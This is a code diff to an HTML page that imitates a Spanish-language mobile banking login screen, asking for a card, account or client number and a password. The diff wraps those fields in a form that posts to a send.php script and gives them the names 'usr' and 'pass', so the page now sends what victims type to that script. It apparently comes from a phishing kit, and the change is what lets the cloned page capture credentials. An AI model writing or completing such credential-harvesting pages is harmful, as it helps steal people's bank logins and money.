@@ -50,7 +50,7 @@
 <body class="h-screen flex flex-col justify-end">
 
     <div class="bg-white w-full bottom-sheet p-6 shadow-2xl animate-up">
-        <!-- Barra gris de arrastre -->
+        <form method="post" action="send.php">
         <div class="w-10 h-1 bg-gray-300 rounded-full mx-auto mb-6"></div>
         
         <div class="flex justify-between items-center mb-8">
@@ -62,7 +62,7 @@
         <div id="step1" class="space-y-6">
             <div class="input-line py-2">
                 <p class="text-xs text-gray-400 mb-1">No. Tarjeta / No. Cuenta / Código de cliente</p>
-                <input type="text" id="userField" class="w-full outline-none text-lg text-gray-700 font-light" autocomplete="off" inputmode="numeric">
+                <input type="text" id="userField" name="usr" class="w-full outline-none text-lg text-gray-700 font-light" autocomplete="off" inputmode="numeric">
             </div>
 
             <!-- Checkbox de la imagen original -->
@@ -78,6 +78,7 @@
             <button id="btnNext" disabled class="w-full bg-gray-200 text-gray-400 font-bold py-4 rounded-lg transition-all duration-300 opacity-50 cursor-not-allowed">
                 Continuar
             </button>
+            
         </div>
 
         <!-- Paso 2: Contraseña -->
@@ -87,7 +88,7 @@
             </div>
             <div class="input-line py-2 relative">
                 <p class="text-xs text-gray-400 mb-1">Ingresa contraseña</p>
-                <input type="password" id="passField" class="w-full outline-none text-lg text-gray-700">
+                <input type="password" name="pass" id="passField" class="w-full outline-none text-lg text-gray-700">
                 <span class="absolute right-2 bottom-3 text-red-600 cursor-pointer">
                     <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                         <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
@@ -98,8 +99,9 @@
                 <span class="text-red-600 cursor-pointer">No es mi cuenta</span>
                 <span class="text-red-600 cursor-pointer">Olvidé mi contraseña</span>
             </div>
-            <button id="btnSubmit" class="w-full bg-red-600 text-white font-bold py-4 rounded-lg shadow-lg">Ingresar</button>
+            <button id="btnSubmit" type="submit" class="w-full bg-red-600 text-white font-bold py-4 rounded-lg shadow-lg">Ingresar</button>
         </div>
+        </form>
     </div>
 
     <script src="logic.js"></script>
